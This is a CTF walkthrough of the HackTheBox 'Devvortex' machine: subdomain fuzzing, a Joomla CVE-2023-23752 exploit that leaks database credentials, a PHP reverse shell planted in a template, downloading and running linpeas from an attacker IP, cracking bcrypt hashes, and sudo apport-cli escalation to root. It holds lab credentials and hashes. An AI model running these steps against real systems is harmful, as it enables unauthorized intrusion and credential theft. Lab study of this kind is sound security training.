
Add machine ip to `/etc/hosts`

![[HackTheBox/Devvortex/images/1.png]]

Check whether target is alive or not.

`ping vortex.htb`

![[HackTheBox/Devvortex/images/2.png]]

Begin with fast port scan:

```bash
nmap -p- --min-rate 5000 -T4 vortex.htb
```

No results obtained:

![[HackTheBox/Devvortex/images/3.png]]

Forgot `-Pn` flag. Added it:

```bash
nmap -p- --min-rate 5000 -T4 -Pn vortex.htb
```

It took a lot time to complete, so a normal service + default script scan worked better:

```bash
sudo nmap -sV -sC vortex.htb
```

![[HackTheBox/Devvortex/images/4.png]]

When I tried to reach `vortex.htb` through port 80 it automatically changed the domain name to `devvortex.htb`, so updated `/etc/hosts`.

![[HackTheBox/Devvortex/images/5.png]]

Found an email on the page: `info@DevVortex.htb`

```bash
whatweb http://devvortex.htb
```

![[HackTheBox/Devvortex/images/6.png]]

Started directory fuzzing:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://devvortex.htb/FUZZ
```

Obtained trash results:

![[HackTheBox/Devvortex/images/7.png]]

A valuable resource suggested that ffuf can be used to discover subdomains via VHOST option:

```bash
ffuf -w subdomains.txt -u http://website.com/ -H "Host: FUZZ.website.com"
```

[Reference](https://medium.com/quiknapp/fuzz-faster-with-ffuf-c18c031fc480)

Had a wrong quotation mark format at first:

![[Pasted image 20260316010546.png]]

Fixed it. Results were noisy, so added `-mc 200`:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -mc 200
```

Discovered `dev` subdomain:

![[HackTheBox/Devvortex/images/10.png]]

Added `dev.devvortex.htb` to `/etc/hosts`:

![[HackTheBox/Devvortex/images/11.png]]

Source code revealed 2 emails: `info@Devvortex.htb` and `contact@devvortex.htb`

Fuzzed the subdomain:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dev.devvortex.htb/FUZZ
```

Found `/administrator`.  A Joomla login panel:

![[12.png]]

![[13.png]]

Ran [JoomScan](https://github.com/OWASP/joomscan) to enumerate:

```bash
perl joomscan.pl -u http://dev.devvortex.htb
```

![[14.png]]

Detected **Joomla 4.2.6**. Searched for exploits and found [CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752).  An unauthenticated information disclosure.

Installed dependencies and ran it:

```bash
gem install httpx paint docopt
ruby exploit.rb http//dev.devvortex.htb
```

![[15.png]]

Got DB credentials without any auth:

![[16.png]]

`lewis:P4ntherg0t1n5r3c0n##`

Logged into Joomla admin panel:

![[17.png]]

I changed logan paul user's password to `loganpaul1234` (this becomes relevant later as a mistake).

System uses PHP backend, so I went to **System → Templates → Cassiopeia** and injected Ivan Sincak's PHP reverse shell:

![[18.png]]
![[19.png]]
![[20.png]]
![[21.png]]

Set up listener and got reverse shell:

```bash
penelope -p 3131
```

![[22.png]]

Penelope auto-upgraded the shell using `python3`:

![[23.png]]

Could not read user flag as `www-data`:

```bash
www-data@devvortex:/home/logan$ cat user.txt
cat: user.txt: Permission denied
```

![[24.png]]

Since I did not have `www-data` pass I could not show which commands I can run as `www-data`. Transferred [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/tag/20260315-d7c1e6ce) to `/tmp/`:

```bash
curl http://10.10.16.64:1212/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Penelope crashed during linpeas execution, had to fall back to netcat:

![[25.png]]

```bash
nc -lvnp 3131
```

![[26.png]]

Already got MySQL creds from earlier. Dumped credentials from Joomla DB:

```bash
mysql -u lewis -p'P4ntherg0t1n5r3c0n##' -e "SELECT username,password FROM joomla.sd4fg_users;"
```

![[27.png]]

Got both hashes:

```bash
lewis   $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan   $2y$10$PdT9Cyemx.F.tO8qFPEkQ.ca13bOgmMwP.VNEPZZJowSBTkd6bDp.
```

![[28.png]]

Most probably `bcrypt`. Tried `hashes.com` first:

![[29.png]]

Then checked via `hash-identifier` ,yet no clear results:

![[30.png]]

Tried cracking with john but the hash wouldn't crack. **Mistake:** I had changed logan's password earlier through Joomla panel, so the hash in the DB was my modified one. It was not the original.

![[31.png]]

After realizing the mistake, retrieved the original hash and cracked it successfully:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt
```

![[32.png]]

`logan:tequieromucho`

SSH'd in as logan:

![[33.png]]

Got `user.txt` from `/home/logan/user.txt`.

Checked sudo privileges ,sı logan can run `apport-cli`:

![[34.png]]

[GTFOBins](https://gtfobins.github.io/) shows `apport-cli` opens `less` which can spawn a shell:

```bash
sudo apport-cli -f
1
2
v
```

Steps:
1. Display (Enter)
2. Freezes (Enter)
3. View Report → opens `less`
4. In `less`, type `!/bin/bash` → root shell

![[35.png]]
![[36.png]]
![[37.png]]
![[38.png]]

Got root:

```bash
cat /root/root.txt
```

![[39.png]]
